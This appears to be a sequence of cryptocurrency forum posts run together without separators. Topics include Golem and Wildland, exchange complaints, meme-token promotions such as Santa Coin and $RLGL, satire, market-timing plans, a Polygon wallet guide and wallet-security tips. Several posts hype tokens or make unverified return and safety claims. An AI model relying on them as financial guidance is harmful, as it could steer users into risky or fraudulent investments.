The company split in two, to **Golem Factory** which is still building that network, and **Golem Foundation** which is building other projects (such as Wildland), where both sides will utilise the same GLM token.

While the original Golem Network (**which will compete with AWS and centralised cloud-compute services**) now has 600 providers who have earned a total of 67,000 tokens for processing computations (you can become a provider and earn GLM y'know), Golem Foundation's Wildland project (**which will compete with Dropbox/Drive and centralised cloud-storage services**) is just taking off.

Wildland, to summarise as best as I can, will replace current centralised cloud storage providers, allowing you to sync many providers together and access data from each all in one folder, synced to all of your devices, with better usability through categorisation of your files.

**From Wlodek, part of Golem Foundation**:

"Let's say you have a large amount of data stored in different cloud buckets - some of your files reside on Dropbox, others on Google Drive, AWS S3 or some NAS. With Wildland you can expose all this dispersed data as one unified file system (or - to oversimplify it a bit - all these files will appear to reside locally on your hard-drive), and manage them with a file manager of your choice (e.g. the MacOS Finder, or if you are a Linux user - Thunar, Dolphin, Nautilus, etc.), without having to use any vendor-specific tools. This feature frees you from dependency on close-sourced, vendor-controlled apps and APIs, and allows you to manage your data with tools that you are comfortable with, and which you can modify to best suit your needs. "

**They have just released the following blog post detailing what's coming up next for Wildland**: [https://wildland.io/2021/11/03/whatsnext.html](https://wildland.io/2021/11/03/whatsnext.html)

**Highlights for me include**:

* Focusing efforts on developing a user-friendly app to replace cloud storage providers
* Free cloud storage 'starter pack' to rival free tiers from Dropbox and similar services
* Wildland marketplace for purchasing additional storage to launch shortly after the app
   * Also available for users to sell their storage capacity to the network
* App available on macOS/iOS initially with Linux, Windows, Android and web apps planned
* Users issued with governance tokens
* **Burning GLM tokens as part of the app rollout**
   * Initially from Golem Foundation's supply and then as part of every Wildland transaction automatically
* Future governance dashboard to allow Wildland to be fully governed by users
* Integration of Wildland with a number of third-party apps and data sources
   * Dropbox, Google Drive and Amazon S3 apparently already available

**Why do I think that Golem is a sleeping giant?**

* Both Golem Factory and Golem Foundation are building big centralised-service-killers which will make those services cheaper and safer for users while also providing other users with an income stream
* The results of a large scientific project to simulate billions of chemical reactions to understand the origin of life on Earth will soon be published in scientific journals, bringing significant exposure to the Golem Network, and likely more researchers who will need to use the network: [https://cointelegraph.com/news/project-partnering-with-golem-network-attempts-to-simulate-the-creation-of-life-on-earth](https://cointelegraph.com/news/project-partnering-with-golem-network-attempts-to-simulate-the-creation-of-life-on-earth)
* Golem Factory has recently built Thorg, probably the most user-friendly mining software available, which pays out in GLM
   * As users use the software, it mines other cryptocurrencies and trades them for GLM
   * Golem are working with agencies to market towards the gaming community primarily to promote Thorg
* Golem Factory is closing in on launching GPU computing, which will accelerate the amount of work that providers can do, making it more attractive for requestors to use the network instead of centralised services
   * Thorg is already bringing in some GPU-heavy users who will, once released, be able to use Thorg for computing on the network *instead* of mining other cryptocurrencies
* Golem Foundation was created with the sole aim of providing more value to the GLM token and ecosystem through creating more use-cases
   * Wildland is their first major project, but every new project will add more use-cases and cause a snowball effect of value
* Coinbase are yet to add the GLM token, HOWEVER, they previously added the old GNT token and thus will need to migrate that to the new token at some point
   * They previously said twice earlier this year that this would be completed during Q1 and then during Q2, so while they are massively behind schedule it is something they appear to intend to do
* Both companies are EXTREMELY well funded, moreso than practically any other cryptocurrency project out there, giving them an insane amount that can be used to market their projects once they are developed enough:
   * Golem Factory has $780,000,000 in Ether and another $28m in their own tokens: [https://etherscan.io/address/0x7da82c7ab4771ff031b66538d2fb9b0b047f6cf9](https://etherscan.io/address/0x7da82c7ab4771ff031b66538d2fb9b0b047f6cf9)
   * Golem Foundation has $504,000,000 in Ether: [https://etherscan.io/address/0x3d4530082c3eb60f58af03f79b1ed3f40e591cd1#internaltx](https://etherscan.io/address/0x3d4530082c3eb60f58af03f79b1ed3f40e591cd1#internaltx)
   * Between them, they have more than a BILLION DOLLARS in funding, which is only going up as the price of Ether appreciates
* Golem Factory is a member of the Enterprize Ethereum Alliance and is dedicated to building on Ethereum and improving the ecosystem alongside hundreds of others: [https://entethalliance.org/eea-members/#g](https://entethalliance.org/eea-members/#g)

I have 0.5 Eth on coin base. I lost the device with authentication codes, and can't access my account. Cb customer support is TERRIBLE. Responses are automated, so pretty much useless.
They have a Twitter but over there, they don't even look at their inbox. This has been so for years. I'm stranded.

I don't even need to withdraw the $$. I just need access to my account.

I have actually attempted to reset the account numerous times but once I submit my details, I'm told that an error occurred.
Also, I used a random username when signing up to in 2016. Maybe the problem is the alias ? If so, how do I go about proving my identity as my primary email and phone number remain the same?

Quite simple, follow these steps to get in line for the next coin that is going to make you a millionaire and f*** all 
1. Pick the coin on whatever the hype is currently. This can be a animal, celebrity or even a tv show. Who knows, if WW3 or a new virus comes out, keep an eye out for (insert event name) coin 
2. Just buy it, DYOR whats that? 
3. Sell it once people start shilling that shi* big time on any social media. Hell, if your parents have heard of it by then and start asking questions, its time to goddam sell and get the hell out asap 
4. Congratulations  you are officially a millionaire

Apart from arbitrage and attacking some poor sod's contracts is there a viable use of flash loans for retail investors?  


Yes they can be used for collateral swaps (if you're about to be liquidated on a DEX) but I have to wonder how many people would use such a system (if one existed)...getting liquidated is not an everyday thing after all.  


I love the concept and am looking for reasons to build something using these tools but I can't think of anything worthwhile apart from arbitrage (and swimming with sharks is not my idea of fun). Yes you could use them to artificially inflate NFT sales but thats kinda grubby.  


Am I missing something or is there a limited legitimate number of use cases for flash loans.

I am aware his videos are supposed to be 'comical' or whatever but his absolutely relentless shilling of utter shit is almost impressive. The way he constantly throws out 10x, stupidly long liquidity locking of 82763 years and the references to D-list celebrities as if that's somehow supposed to attract you really is something to marvel at.

Even the comment sections are the same:

75% bots
20% bullshit quotes about getting rich
5% people asking for their money back after purchasing ELONCUMSHOT INU

It is both simultaneously hilarious as a parody and scary how much traction both the subreddit and his channel brings.

So, i recently started investing in some new coins, figured id throw a few hundred bucks in and hope to get lucky
I made a metamask wallet and ever since im trading my BNB to some new coins on pancake swap.
Started out with 100 usd and made some trades into Quack, NEKO and SDBY.   I made 20-80% on some of them. And at the end of the line i am finding myself without profits.
How do you guys deal with this? Pancake swap requires me to have a slippage of 10-15% for trades most of the time. If i change settings to less i keep getting: Insufficient_output_amount.

So im losing 10-15% when i change BNB to new coin. And when i make 50% on it and i change it back to BNB i lose 10-15% again??

Basically, everything that interests me is written in the title, but you can't contribute here if the minimum number of characters that must be written here is not met. I guess there must be at least five hundred of them? Furthermore, writing is something I am a professional in and that is exactly what leads me to the question of whether there are crypto projects that would be interested in publishing books using the NFT. I am referring, of course, to e-books that would be stored on a blockchain so that they can be sold, distributed, lent, exchanged, and so on more efficiently. Thank you.

Just thought I'd share this with everyone, as I am truly inspired by how amazing this project is for the world.

Elongate is a Charity-driven Crypto Currency that aims to directly link helping with earning. In the last 7 days they did a little over 25 million dollars in total volume, and approximately 1% of all transactions go directly to charity - which comes out to around $250,000 that will be donated directly to charity organizations across the globe.

And honestly, the project is just getting started. They have a relatively low market cap, and they are rapidly growing by the day. Imagine when they start trading 25 million dollars per day, instead of per week? The money being raised for charity could be in the millions each and every week, or even more!

I'm really excited for the future of this project, so I just thought I'd share this bit of positive news with everyone.

The $RLGL token is a new token born on the 29 Oct inspired by the popular Netflix show SQUID GAME and does have a unique features inspired by the first game in SQUID GAME "red light green light" and the token is NOT related at all with the SQUID token that have done a massive RUG PULL. 

The liquidity pool is locked until 2030 and there is proof of that, also there is no DEV wallet so it seems a fair launch of the token.

The first day sadly the token experienced a massive pump and dump that seems to have killed the token for the moment + people still traumatized by the SQUID token RUG PULL so they think this token will do the same.

It can only be bought on pancakeswap for the moment and has a website " THERLGL " for more information.

Just wanted to adress this and see y'all what's your thoughts about it.

I am a complete newb to crypto investments. But with the recent price jumps in the market i wondered if now is the right time to start investing in coins like btc and eth. 

However with the price booming right now, is a crash coming in the near future that would diminish all my gains? 

Should i wait for a price crash before buying? 

Do you guys only buy to hold long term or on a short term trading basis?

Are there any coins except btc and eth that provide stable returns? Admittedly i briefly considered dumping some cash into shibu. Any advice or resources are appreciated!

What do you guys think will happen to crypto after CBDCs are introduced? I dont think it will hurt bitcoin much if at all. Because it has so much institutional investment already. 


But I do think that it will be very bad for DeFi. Unregulated stablecoins absolutely will not come away unscathed. Thats for sure. Look at how many regulations and how much red tape there is for traditional banking. You may think that DeFi fixes this. But the regulations and red tape are not a bug, they are a feature. Its by design to prevent money laundering and terrorist financing. DeFi proponents claim that it will reduce friction in banking but the friction is absolutely by design. 

I do not think you will be allowed to use non KYC stablecoins in the future. If you go to a bank today, you need an ID to sign up. And banks need to be compliant. Theres a reason offshore bank accounts are called offshore, they cant legally operate in the USA and not report to the government. The government isnt in the habit of reducing regulations. In fact its quite the opposite. I think physical cash is a thing of the past, and CBDCs will be forced on us to everybodys entire transaction history is on record. And a CBDC will absolutely be freezable by the IRS/Fed. 



Thats why Im bullish on monero because crypto wont survive if it tries to be compliant. Because its impossible to be both compliant and decentralized. What crypto right now currently complied with AML/FATF regulations? When govts crack down monero will be the least hurt because its already a de facto criminal coin.

one of my friends recently contacted me after ages and asked if I'm interested in crypto. I've been investing in crypto for a while now (well, its been only 4 months) and told me that he is now a part of a great crypto project and he wants me to invest in it. I asked him a lot of questions and he made someone from the team call me. I asked the guys about many things, like what's the project is about, what they intend to do, who are the main investers, where is the white paper etc. The guys seem like they know things to make people believe that they are some kind of block chain experts, but I know they are not. They know enough to answer questions. That's it.
I still know it's a scam but I  don't know how to prove it so that I can help my friend to realise that he's being scammed. How do I check it?

I tried to explain to my girlfriend how it worked, I was missing some details.  


Were the devs in control of the smart contract that people swapped their other tokes to SQUID for? Or did the devs just market swap all their squid tokens for the available buy orders at the end? I mean, I can't seem to wrap my head around it.  


Could it be that the devs owned 100% of the tokens and then when people swapped their other coins to SQUID, the devs received those? Because why on earth would they dump the price in such a scenario? They could have easily kept it going for a while more. How was the token programmed?  


There is a technicality in this that I don't completely understand and it bothers me.  
Thanks to anyone with (intelligent) suggestions

We often talk about the legendary creator of Bitcoin, Satoshi Nakamoto. When we think about him, the main thoughts are "Wow he has more than 1 million BTCs (distributed in more wallets), he's so rich...Well, you're wrong. The wallets linked to him have been inactive for looong time and NOT for choice. These wallets are constantly monitored because of the "whale" status of their owners and these wallets could surely have been lost or inaccessible ofc, but what would happen if a wallet inactive from 2009, attributed to Satoshi Nakamoto, registered an outgoing transaction? Don't forget that the entire BTC identity is based on the anonymity of its founder.

Whoever own those wallets cannot access them, because the first outgoing transaction would cause a massive crash of BTC price.

Imagine having 60 billion dollars in BTC but unable to sell or use them...

I'm going for: (one liners are copy/pasted from website, I encourage you to go check them out)

Moonbeam - an Ethereum-compatible smart contract parachain on Polkadot.

Acalla -  the decentralized finance network and liquidity hub of Polkadot

Litentry - A network that supports cross-chain aggregated identities.

There's also a pretty interesting CoinBurea video on some of the potential best parachain projects - https://www.youtube.com/watch?v=KzqLf7Kteuk&amp;t=926s


If your project gets picked, your DOT may be locked for 2 years, so decide if it's worth it. I'm going to dedicate about 10% of my DOT to the auctions and see how I do

So this will be called a shilling post. But I really want to share this with our community.

So I have stumbled on this new shit/meme coin called Santa Coin, it has really low market cap, and stable growth. 

But interesting part is that by holding Santa Coin in your wallet you get rewards in BUSD! And that is legit, I have tried it and it works! Do your research about this coin and invest if you want. You could get  some cash for Christmas presents in example.

You can buy it on PancakeSwap, DYOR!

Check out their socials, LP is locked so they wont rugpull I hope so. But Ive put in some pocket money.

Check it out and tell me what you think about it.

I am ready to take critics now.

Have a nice day.

Sorry for such a bearish post, but Im in the UK, and you absolutely cannot escape climate change in the media right now. Obviously this has been accelerated by CO26 and Prince Williams Earthshot prize. Almost every major company is now paying lip-service to environmental concerns in their marketing, and social media in particular is awash with it.

Our biggest hurdle then is over-coming the stigma that Cryptocurrencies (specifically, the mining of Cryptocurrencies) are wasteful, inefficient, and environmentally unfriendly.

This obviously only really applies to Proof-of-Work projects which require heavy mining, but the worlds largest project (and the one most synonymous with Crypto generally), Bitcoin, will always be PoW. We have already seen Elon Musk raise these concerns when he reneged on allowing for BTC to buy Teslas.

So, Im wondering what your thoughts are on how much of an impact environmental activism will have on the space? And how do we overcome it?

Discalimer: I hold personally hold SOL, but it makes out less than 10% of my portfolio

Currently [this](https://www.reddit.com/r/CryptoCurrency/comments/qmbidk/a_word_of_caution_about_solana_sol/) post is trending in hot. The OP of the post claims that the solana developers shut down the network after a DDOS attack. This is only partially true

Heres what really happened: 

OP was right about the DDOS attack, but the devs did not press a button to shut down the network, the network " encountered a large increase in transaction load which peaked at 400,000 TPS" which "caused the network to fork multiple times", according to the Solana foundation. They did not restart the network by simply pressing a button either, they coordinated a restart with all their validators which they coordinated in their discord.

What this means is that the network started to split itself into multiple chains with different blocks (due to the DDOS attack), and therefore the validators decided to install a patch to get the network running again.

[This](https://docs.google.com/document/d/1vS4ATFCF4tCGxcdH7IBMTej6zZktSajisQcNNMKYhig/preview?pru=AAABfAoSZOk*tJOYlfpPo58tm2P15YJNcA#) document shows the instructions for validators on how to install the path to "restart" the network

The moral of this: Do not believe everything this sub is saying. A lot of people here have no idea about the tech behind crypto (which is not a bad thing, but can be if those people start spreading FUD/misinformation) and dont realise that decentralisation is not a yes/no question, it is a spectrum.

Pretty genuine that I rarely miss these shitcoins pumps and myself have already converted 4.69$ into 42.0$ using the same methods (huge!), buy shitcoins and pray for all God mighty that Elon tweets about it. 

Let's just say that I completely missed the SQUID coin last week which made a crazy run were made several users got milionaires and got me jealous, UNTIL it suddenly, miracle happened and a super dump just appeared out of nowhere! This is it, my time to get it, my golden ticket! Bought everything I was saving after working 1 year at McDonalds, that's about 1000$ and dropped all in Squid!

Currently the coin is up 7x and looking at the chart, I'm feeling SUPER BULLISH on it because it shows a parabolic triangle strand which is hyper bullish and I can already see it going to mars and reaching all time highs! If this happens, according to my head, in about 3 days, I will be a MILLIONAIRE! I already quitted my job and plan on changing my wife soon. 

Ask me anything, no need to thank about this super bullish info for free lambo!

This guide will cover how to:

1. Set up your MetaMask wallet for Polygon, and

2. Fund your Polygon wallet.


Step 1: Setup MetaMask for Polygon


You should already have the Metamask wallet installed in your browser, which you used to register for our whitelist.Your wallet address is the same on Polygon as it is on Ethereum.(Our guide will use Metamask, but any otherPolygon-compatible walletis also supported.)

The first step, if you havent done so yet, is to add the Polygon chain to your Metamask wallet.

Switch the connected blockchain by clicking on the tab Main Ethereum Network.

Scroll down until you find Custom RPC.

Enter in the Polygon/Matic Mainnet settings as follows:

Network Name:PolygonNew,
RPC URL:https://polygon-rpc.com,
ChainID:137,
Symbol:MATIC,
Block Explorer URL:https://polygonscan.com/

ClickSave.


Step-2. Fund your Polygon wallet


Option A: Bridge tokens from Ethereum to Polygon

If you have existing funds in a wallet on Ethereum, you can bridge them to your wallet on Polygon. NOTE: This can sometimes be expensive due to Ethereums high network fees.

One of the most popular ways of bridging from Ethereum to Polygon Is throughPolygons official PoS Bridge.

It will take about 7 minutes for your funds to complete the bridge using the PoS Bridge. If you want instant bridges top Polygon, you can alternatively bridge usingCelerandHopprotocols.


Option B: Transfer from a token exchange

Several exchange platforms support withdrawing tokens to external Polygon wallets. These include Cryto.com, Binance, OKEx.

Adoption is on the rise world wide with industries, nations, banks, cities all looking to ride this wave to wherever it takes us, now we have seen NFTs sell for a locked price in Ethereum (in most cases) regardless of price volatility which is an incremental step in decoupling from central bank currencies but we have yet to see someone big take the risk the market has been waiting for and list their first product lock to cryptocurrency.  This would be enormous for the space and open the conversation for use case while reconditioning ours minds to think in terms how much things cost in bitcoin for example, it is also super risky given the volatility the market  has seen since its inception. 
All being said, I have this feeling this will be coming very soon, Tesla might be the first mover in the auto category since they already have a large stake in crypto and a CEO who's fanatic with the space and has a huge following but a lot of gears have to move in synchronicity to make this happen.  Then it occurred to me who will be first, the industry with high R&amp;D costs but low production cost and more sales equals higher profits margin percentages: Software, Games, Virtualized Entertainment. 
The giants in those industries can afford to peg their products to cryptocurrencies if it means getting it into more households and additional subscriptions, their costs are relatively stable. 
This move will be huge for everyone, it might change how we see and use crypto, but it will change the world. 

Baby let's go

I see a lot of people saying you can't time the market, but it's exactly what I plan to do.

You can time the BTC market top. The monthly RSI crosses 90 only when it's a market top. So I'll DCA out 10% weekly when that happens and buy back at market bottom, which again is predictable because it reaches the same RSI every cycle, and does so only at market bottom. Once it falls below 50 RSI on the monthly, I'll DCA in 5% every week. Now I'll have more Bitcoin than I started with.

This has happened every cycle since Bitcoin's existence, so I assume it'll happen again. A market cycle starts at Bitcoin halving every four years.

Is my plan flawed?

What are your opinions on small cap coins like like VTC. It is an asic resistant, proof of work crypto with a total of 84 000 000 coins. The market cap at the moment is around 45M$ with a price of 0.75$. The ATH was close to 10$. 

If a Billion USD is added to the VTC market it would cause atleast a 20X in value if I understand the math correctly. 

VTC is not listed on any major exchanges anymore, probably due to its low volume. 

I get a feeling this could be the GME of cryptos if played correctly with a large community

My family arent very in the know ok crypto, but my mum has been more keen to listen as of recent. Weve done similar things before as a family, but now everyone has a little bit of excess money that could be a very good investment instead.

My family are open minded, I know people say not to discuss crypto with family etc, but everyone is different. They would understand the risk, but theyd all make their own choice because my family is like that haha.

I think a collective dca could work out really well, what do you guys think? Should I just stick to it myself? I wanna help repay my parents for all the financial support theyve given me, and I feel crypto may be a great place to start!

So currently I've been in crypto for a year.

I'm nicely spread between some big coins and only a couple smaller coins. 

Currently I'm up in total fro. 2200 to 5600 aud. 

My question is this.

Do I go high stakes and invest all the money into the coin that made 90% of that profit.

It has good potential.

It is only the beginning of the roadmap and has applications.

I do believe in the project and think it will be the next big thing in a few years.

It could generate me generational wealth within my lifetime if it goes according to plan.

Or do I keep it safe and slowly gain but probably miss out on massive gains.

Yours sincerely a trusted HODLer

Edit: this isn't money I need but I would prefer to see it grow so I can prove to my wife it wasn't a silly idea.

Of course Im not even thinking about memecoins, so dont even bother suggest one. I am talking about serious projects with tech behind, real applications and utility. 

Market cap is the main factor, as it must be very low to be outside the top 500. 
So Im talking about projects that arent still very popular, but that seem to have a solid roadmap or a new niche/idea in mind.
I know its difficult to distinguish between a scam and a legit coin in its early phases, so please dont take any of the following answers as a financial advice, and always DYOR.

Heres a guide that can help anyone whos trying to understand if a new coin is legit or a scam (like Squid-Game token for example):

I recently sent some XLM from Coinbase to Kucoin and the memo didn't attach for some reason even though I definitely entered it. I noticed Coinbase's XLM network was under maintainance so i'm wondering if that was an issue. 

Anyway, Kucoin asked for $50 USDT to return my XLM to Coinbase without a memo which means i'll have a whole fuss with Coinbase when they send it back. I haven't heard back from Kucoin since I paid the fee of $50 USDT.

Someone else I know had a similar ordeal and was asked to pay $100 USDT to get his funds back. He paid that over a week ago and has heard nothing.

Why is Kucoin so shady?

We had some big news this year in the crypto space such as Tesla investing in Bitcoin and El Salvador making Bitcoin legal tender. Such news are often followed by big pumps in the market as adoption increases.

Which news or event do you expect to be announced in the next months that will ultimately fuel the push beyond a 100k Bitcoin? Will Apple and Amazon follow soon? More countries making Bitcoin legal tender? More ETFs being approved?

Or will we have more FUD? How often will China ban Bitcoin again? And how many Dog coins will there be in the top 10?

What would be the most bullish news you can image for the crypto space?

latley i see many post in all crypto groups shilling Banano coin and yet i do not understand what is all the hype around it?

i see it on daily basis so I have checked it and noticed there is a microcap of 1.3 million and 3000ish addresses that hold on that coin, ONE. THREE MILLION! it is super small cap for a coin that get shilled that way.! 
with that said i do not understand why i see so many posts about it but i had to chip in and get my share of Banano just incase it will reach 100million marketcap. as far as i understand it is feeless meme coin that tip you by simple tasks of discord and telegram bot and that way you can earn Banano and you do not really have to buy it.
I wonder how many of you heard of Banano? 
do you guys hold some?
 seems like it is on its right way to grow with all the meme, gifs and post on it in the last week.
have a blessed week rich with potassium y'all.

This is a particular pet peeve of me, I don't like the "Satoshi" word for the fractions of Bitcoins. 

I have absolutely no particular reason why, I just don't like the way it reads, the way it sounds, I don't even know, maybe I'm just being a bit pedantic.

Also functionally I don't think it was properly sorted out. We would need some proper naming like we have for binary prefixes, Gigabyte, terabyte kbite, petabite, etc.

What other names would you reckon that would make for a better name than "Satoshi" for the fractions of bitcoins??

 It has been a long ride. It keeps getting stuck with me for multiple runs because I could not depart from it yet. But now because I have it for so long I think I am ready to distance myself from it. Why would you keep something while you can do so much better without it. Like I think it will be better for my health in the long run. I don't really need both of them.

It's time to sell my kidney. So if any of you are in need of a kidney I'm selling mine. 25 years of usage, dissolved a bit of hopium, 1 owner, bloodtype Bullrun positive. Price is 0,5 Bitcoin. Please contact me if you need it. Sharing is caring right?

For the first time since 2017, my buddy has sold his Crypto in order to recognize profit - which he has! Hooray for him. 

He is now in a position that he has some FIAT currency that he doesn't want to bring back into his country or use. This is because he wants to buy more crypto later (hopefully in a bear market). He asked me what to do.

I don't really like the idea of it sitting idly on the exchange but I am really unsure of how else to recommend he store it and avoid multiple costs moving it around.  Where do you store your fiat in between crypto purchases/after crypto sales?

Okay so, couple of things, I'm VERY new to the whole crypto thing, but I see alot of potential yada yada I wanna start mining, I am currently mining on my personal machine, ryzen 5 3600, gtx 1080 founders edition, GPU is  at 58-62c under full load, however I'm still getting pretty wack mining profitability, 20 megahash~ and 1.5$ a day mining Ethereum, (using trex miner btw)

I'm also setting up a second rig soon, with a gtx 1060 6gb, so I wanna be ready for next time, anyway I'm using 2miners and my payouts is a minimum of 0.005 Eth, I only have 0.001 Eth ATM, I've heard raven is a good coin to mine and I'm thinking of swapping over, should I start mining raven or nah?

Also is metamask an okay wallet to use? The thing is I'm still a kid, so I can't use binance or coinbase, and that 6$ would be nice not to throw away, because I don't get allowance or any of that, mining is my allowance

Sorry for the whole rant just wanted to hit the 500 minimum characters,


Anyway TLDR:

Should I use metamask or no? Cannot use a wallet that requires verification (not old enough)

Should I mine Eth? I know Eth has high gas fees and isnt the most profitable coin there is

How do I maximize my mining speed? My 1080 is mining at a slow rate of 20mh/s, Im also getting a 1060 6gb soon

Generally if you got anything important I should know before entering the crypto world? I'm happy to discuss and learn!

**Hi All** 

Just thought Id do a quick post on additional security on **meta mask** and **trust wallet**. Recently during the rise of MEME/SHIT coins, I've seen countless posts on telegram/discord/other sub reddit's about individuals being scammed and having their wallets emptied.

See below security measures that can be implemented below 

**Meta mask**

Settings &gt; security &amp; privacy 

* Back up secret recovery phase 
* Set a password on the app 
* Enable app auto-lock  
* Enable sign-in with face ID (if your forgetful with passwords)
* Clear privacy and browser data/cookies regularly ( if you buy  crypto on the in-app browser)
* Enable privacy mode

**Trust wallet**

Settings &gt; security 

* Enable App lock 
* Enable Auto Lock 
* Enable transaction signing 
* Android users with in app browser follow steps above 

**Common security measures**

* Always discount wallet after buying crypto on in-app browsers 
* Never interact with random tokens that have been airdropped to      your wallet these can be scams, a lot of you will not be aware that you      have these in the first place. View your wallet on a transaction browser to      see whats hiding in there 
* Admins on apps like telegram &amp; discord will never message you      first. The most common scams are 
*  *we need to authorise your wallet* 
* * staking has now finished please sent your tokens to this wallet* 
* Never give your seed phase to anyone
* Never upload screenshots of your wallet this makes you a target to scammers

&amp;#x200B;

Feel free to add any other security measures you have in place for  you security

**i look forward to hearing from you**

Hello, I am in crypto for about 2 years and was only mining BTC with some small investments. Also do you think it is better to buy (for money) or convert from crypto to another crypto? Now I want to invest more and I am wondering wether it is worth it investing into ETH or not. In this post I am wsking for your opinion about buying it right now or waiting. Also I would love to hear about other cryptocurrency you are investinh in. I have already done my research and made my opinion about it, but still want to ask more people just to make sure. Thank you for all comments and tips.

Joined this reddit few days ago, so excuse my structure of text. Thanks.

I guess you can say Im new to crypto and have done my own research on this coin and its small community on reddit. What I find interesting about it is the fact that holding the memecoin means you can earn a share of the 2% that users get from every single transaction and you can also get 15% APY from staking it. Now, I dont know all the cryptocurrencies out there(not even to a great extent) and this is the first that Ive encountered a memecoin of this kind. Are there others that have a similar or better benefit? What are your thoughts on this memecoin?

My post from yesterday went offline due to some serious market manipulation that we made. I will post the link in the comment section since Im not allowed to post it here. Be fast and read it before Reddit takes it down completely. 

Ive posted something like 16h ago and here is some professional analysis on what happened with price of LTO afterwards: 

1. Price per token went up 4%. 0.285 -&gt; 0.297
2. Trading volume increased by 600k. 9.2m -&gt; 9.8m
3. Market capitalization increased by 3,5 million. 83.7m -&gt; 87.2M 

You guys are some serious gangsters and grey cardinals of crypto industry! If you read the comments carefully you will find the exact guy to blame for your favorite coin to stop pumping and the guy to thank for your favorite coin to pump like crazy! No wonder posts like that are taken down. 

Im scared for my life, my assets and my future. I think that my security is compromised and I need to change my location asap. Otherwise FBI might find me and wait, there is someone ringing the doorbell

Is overwhelmingly, to hold.

Even in a bear market, when the charts are bleeding red. To hold. 

Even when there's threads about taking profits, telling me to take out 10%, 20%, yada yada yada. Even when you think taking out a portion of a Bitcoin is the smart move. It *never* is. 

If you cannot afford to buy large amounts, simply DCA and stay AFK.

Do not. Take profits.

Why?

Here's a personal anecdote.

I didn't realize how valuable Bitcoin was around this time in 2016, hitting $700, I thought to myself, "Wow! It 2x'ed!, lets sell and take the easy profits. Crypto is easy money. I'm going to wait for a correction to $400 and re-buy and make some more!" 

Alas, the chance never arose.

Once a week, I would watch the charts, trying to time the perfect moment, to buy back in. However, I felt like it was always overpriced. To my disbelief, over the course of the entire YEAR, I watched it grow from a mere $700.....to over **$7,000**.

It actually put me off crypto, all the way until the Covid-19 crisis of last year. I didn't make the same mistake and slowly started buying some Bitcoin over the course of the year. 

My only regret? Not buying more, and putting off on buying ETH.

 Want to make long-term profit and true money? 

DCA and stay AFK.

Some **important notes** about analysis   
1. Analysis was done from **1st of January** of each corresponding year till **31st of December** of the same year

2. **KSM**, **AMP**, **SHIBA** *ICO* price was not found, therefore the *ICO* price was used from the earliest historical data from ***CoinMarketCap/CoinGecko***

3. ***n/a*** means that a coin was **not released** that year

4. If a coin was released, for example, in **July 1st 2018**, then the analysis of that year was done from *the date of ICO till 31st of December of the same year*

5. Coins were sorted from the most ***ROI*** from the *ICO* date till **30th of October 2021**

https://preview.redd.it/xb6q22gtjjx71.png?width=651&amp;format=png&amp;auto=webp&amp;s=2889d3de5edc74884301140d2a8ce1595b75dda4

Key takeaways

1. **Bitcoin** has the most ***ROI*** from *ICO* date, but compared to other coins, gives less **ROI** each year, still a solid investment
2. **Ethereum** gives better returns than **Bitcoin**, but is worse in ***Bear Market***
3. **Shiba Inu** has pumped only this year. In **2020** it **lost value significantly**, which means maybe after this bull run, it won't give any ROI anymore. Still hard to analyze with only 1 year of history
4. **Axie Infinity, Solana, Kusama,  Polkadot, Helium, Aave, Avalanche, Pancakeswap, Uniswap, Sushiswap, Injective Protocol, Arweave** all were *ICOed* in 2020, and in a span of ***1,5 years*** they gave insane returns, if they continue with the same pace, you can ***10x*** your money in the future
5. **AMP** *ICOed* in 2020 and is ***the only coin*** in this table that gave ***consistent negative returns***
6. Our beloved **Algorand** have a negative ***ROI*** from the *ICO*, but if you were buying the dip, you should be good
7. **Litecoin** is like a little brother of Bitcoin that doesn't get any toys. It gives consistent positive ROI but compared to others, it is really little return
8. **Technically almost every coin has pumped at least 500% this year**

I've never had an addiction to anything. I don't have a phone, just to avoid getting addicted to it. I don't eat fast food for the same reason. 

So I don't have a tendency for addictions, but right now I am definitely addicted to crypto. In the past couple of days I got in some coins that pumped really hard, like Sandbox. I doubled my portfolio within an hour or so. 

And then I got some other pumps from other coins, which almost doubled it again. In the past few days I made more money than ever before. But now I am worried about developing an addiction. 

I can basically quit my job now with the profit I sent to my bank account. But I keep taking more and more riskier bets and they keep working well for me. But this will work until it doesn't of course.

I've basically turned into the people from Wallstreetbets who yolo 1000s of dollars on one bet and I am very addicted to it. 

**No, I am not bragging about making a lot of money. Lots of people are, we're in a bull market. But I am so addicted to making money now that it hinders my sleep, my work etc. Has anyone else dealt with this before and how did you overcome it?**

Crypto dippin, Crypto rotten,
Crypto rising, Crypto toppin!

Housing crisis, Mortgage poppin,
The few with cash exploit the bottom.

*

To exist is to live
And to live is to suffer,
So when you print non-backed fiat,
Youre a cold mother-fucker.

Its the oldest of scams,
Exploit labor - take your time!
In exchange for a shrinking
US nickel and dime.

Were all slaves, cant you see,
To a system that burns,
First the forests, then the skies,
For the freedom, you must earn.

Earn a wage, earn respect,
Stay on late, skip your snack,
Heres some crumbs while you rent,
Til you die in a shack.

Break your neck, break your leg,
Break your heart, break your back.
But til then Ill be here,
Stackin Moons, stackin Sats.

The title says it all. Try to come up with your favourite crypto using emoji.

It doesnt have to be a perfect one.

Well it doesnt even have to be your favourite.

Lets see how creative you guys can be and lets guess each others comment.

I will go first :

First of all, respect to the HODLers who are planning not to sell anything for the next couple years.  
But to the people that would like to make a quick buck, or could really use the money;  
**Don't be afraid to take profits!**  
**My story (read TLDR below if you're not interested hehe)**  
In aug 2017 I started investing in crypto because my uncle was enthousiastic about it, BTC had just set a new record at around $4.400 and was on it's way to even higher peaks. Everything was looking nice, everyone was making profits. In September we had a major pullback of 35%. The red days we're certainly painful to see after all the non-realized profits but Bitcoin was soon to rally up to almost $20k which were the best crypto days of my life. My small investments in altcoins had brought me great returns and everyone around me  was making money. I can still remember being on vacation with my dad, laying on the beach, checking our portfolio every 5 minutes and talking about our dreams with the money we were going to make. That was... until the start of 2018, BTC quickly went down from almost $20k all the way back to $7k and from there slowly bled to around $3k in the next 10 months. After holding for around 7-8 months in 2018, red almost every day, my motivation sank and I stopped DCA'ing and sold some of my coins. A lot of the coins that were booming in 2017, either stopped working on their project or bled to dead and were soon to be replaced by the next generation of coins being released at the start of the next bullrun. In 2019 the market was slowly recovering again. All the alts I was invested in, were worth a fraction of what I bought them for and the new generation was flying to new heights and I was left with a red portfolio after being x10 in the 2017. I was afraid to put more money in crypto so I missed most of this bullrun as well and am now taking it easy and taking profits once in a while.  It was a super expensive lesson for me, and a tough hit for my mental health, but we learned from it, and that's why I'm trying to warn this new wave of people.  
